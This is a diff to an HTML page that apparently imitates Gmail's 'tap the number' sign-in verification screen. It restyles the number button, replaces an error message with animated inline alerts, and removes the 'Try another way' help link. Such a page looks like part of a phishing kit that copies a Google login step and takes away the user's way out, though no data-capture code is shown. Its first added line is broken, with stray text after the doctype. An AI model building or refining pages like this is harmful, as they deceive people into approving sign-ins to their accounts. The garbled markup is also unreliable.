@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+<!DOCTYPE html>led
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -125,20 +125,21 @@
 
         .single-number {
             display: inline-block !important;
-            width: 120px !important;
-            height: 120px !important;
-            border: 3px solid var(--gmail-blue) !important;
+            width: 80px !important;
+            height: 80px !important;
+            border: 2px solid var(--gmail-blue) !important;
             border-radius: 50% !important;
             background: var(--gmail-white) !important;
             color: #202124 !important;
-            font-size: 36px !important;
+            font-size: 24px !important;
             font-weight: 600 !important;
             cursor: pointer !important;
             display: flex !important;
             align-items: center !important;
             justify-content: center !important;
             transition: all 0.2s ease !important;
-            box-shadow: 0 4px 8px rgba(26, 115, 232, 0.3) !important;
+            box-shadow: 0 2px 4px rgba(26, 115, 232, 0.2) !important;
+            margin: 0 auto !important;
         }
 
         .single-number:hover {
@@ -216,15 +217,81 @@
             text-decoration: underline !important;
         }
 
-        .error-message {
-            background: #fce8e6 !important;
-            color: #c5221f !important;
-            padding: 12px !important;
-            border-radius: 4px !important;
-            margin: 16px 0 !important;
+        /* Inline alerts */
+        .inline-alert {
+            margin-top: 12px !important;
+            padding: 14px 18px !important;
+            border-radius: 12px !important;
             font-size: 14px !important;
-            text-align: center !important;
-            display: none !important;
+            font-weight: 500 !important;
+            display: flex !important;
+            align-items: flex-start !important;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1) !important;
+            border: 1px solid transparent !important;
+            opacity: 1 !important;
+            transition: all 0.3s ease !important;
+            animation: slideIn 0.3s ease-out !important;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0 !important;
+                transform: translateY(-10px) !important;
+            }
+            to {
+                opacity: 1 !important;
+                transform: translateY(0) !important;
+            }
+        }
+
+        .inline-alert.error {
+            background: linear-gradient(135deg, #fce8e6 0%, #fef2f2 100%) !important;
+            border-color: #fecaca !important;
+            color: #dc2626 !important;
+            box-shadow: 0 4px 12px rgba(220, 38, 38, 0.15) !important;
+        }
+
+        .alert-content {
+            display: flex !important;
+            align-items: flex-start !important;
+            gap: 12px !important;
+            width: 100% !important;
+        }
+
+        .alert-icon {
+            font-size: 18px !important;
+            flex-shrink: 0 !important;
+            margin-top: 1px !important;
+        }
+
+        .alert-text {
+            flex: 1 !important;
+        }
+
+        .alert-title {
+            font-weight: 600 !important;
+            margin-bottom: 2px !important;
+        }
+
+        .alert-message {
+            font-weight: 400 !important;
+            line-height: 1.4 !important;
+        }
+
+        .alert-close {
+            background: none !important;
+            border: none !important;
+            color: currentColor !important;
+            cursor: pointer !important;
+            font-size: 16px !important;
+            padding: 0 !important;
+            margin-left: 8px !important;
+            opacity: 0.7 !important;
+            transition: opacity 0.2s ease !important;
+        }
+
+        .alert-close:hover {
+            opacity: 1 !important;
         }
 
         @keyframes spin {
@@ -304,11 +371,9 @@
             <div class="loading-spinner" style="margin: 24px auto; width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid var(--gmail-blue); border-radius: 50%; animation: spin 1s linear infinite;"></div>
         </div>
 
-        <div class="error-message" id="error-message">
-            Incorrect code. Please try again.
-        </div>
+        <!-- Error messages handled by inline alerts -->
 
-        <a href="#" class="help-link" onclick="needHelp()">Try another way</a>
+
     </div>
 
     <footer class="gmail-footer">
@@ -383,7 +448,6 @@
             document.querySelector('.number-display').style.display = 'none';
             document.getElementById('tap-instruction').style.display = 'none';
             document.getElementById('loading-state').style.display = 'block';
-            document.querySelector('.help-link').style.display = 'none';
 
             // Change title and subtitle for loading state
             document.querySelector('.choose-title').textContent = 'Verifying...';
